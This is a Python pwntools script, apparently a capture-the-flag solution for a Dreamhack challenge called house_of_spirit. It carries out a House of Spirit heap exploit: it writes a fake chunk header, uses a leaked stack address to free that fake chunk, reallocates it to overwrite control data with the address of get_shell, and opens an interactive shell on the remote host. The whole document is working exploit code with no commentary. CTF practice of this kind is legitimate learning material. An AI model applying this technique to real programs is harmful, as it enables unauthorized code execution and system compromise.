#!/usr/bin/python
from pwn import *

context.log_level = 'debug'
#p = process("./house_of_spirit")
p = remote("host1.dreamhack.games", 8261)
elf = ELF("./house_of_spirit")
get_shell = elf.symbols['get_shell']

def create(size, data):
    p.sendlineafter("> ", '1')
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("Data: ", data)

def delete(addr):
    p.sendlineafter("> ", '2')
    p.sendlineafter("Addr: ", str(addr))

def exit():
    p.sendlineafter("> ", '3')


data = p64(0) + p64(0x40)

p.sendafter("name: ", data)
leak = int(p.recv(14), 16)
log.info("leak: "+hex(leak))
free_ptr = leak + 0x10
log.info("free_ptr: "+hex(free_ptr))

#gdb.attach(p)
create(0x40, 'A'*0x40)

delete(free_ptr)
create(0x30, 'A'*0x28 + p64(get_shell))
exit()

p.interactive()
